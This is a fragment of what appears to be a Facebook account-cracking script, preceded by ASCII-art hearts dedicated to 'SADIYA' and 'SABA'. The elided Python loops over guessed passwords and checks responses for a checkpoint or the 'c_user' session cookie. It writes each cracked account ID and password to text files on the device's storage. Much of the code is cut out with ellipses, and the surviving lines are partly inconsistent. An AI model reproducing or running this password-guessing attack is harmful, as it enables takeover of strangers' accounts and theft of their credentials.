...
_*ily* ______*I Love SADIYA*___*ily*
...
*ily* __________*ily*__________*ily*
*ily* ________________________*ily*
_*ily* _____* I love SABA *____*ily*
__*ily* ____________________*ily*
____*ily* ________________*ily*
______*ily* ____________*ily*
________*ily* ________ *ily*
...
_______________*ily____________BALIIJUTT512
	...
	for pas in pw:
		...
		try:
			...
			if "checkpoint" in r.text:
				...
				cp.append(id)
				open("/sdcard/SABAXSADIYAcp.txt",'a').write(id+' - '+pas)
				break
			elif 'c_user' in r.text:
				print(f"{g}[CP] {id} | {pas}{s}")
				ok.append(id)
				open("/sdcard/SABAXSADIYA ok.txt",'a').write(id+' - '+pas)
				break
			else:
				pass
		except:
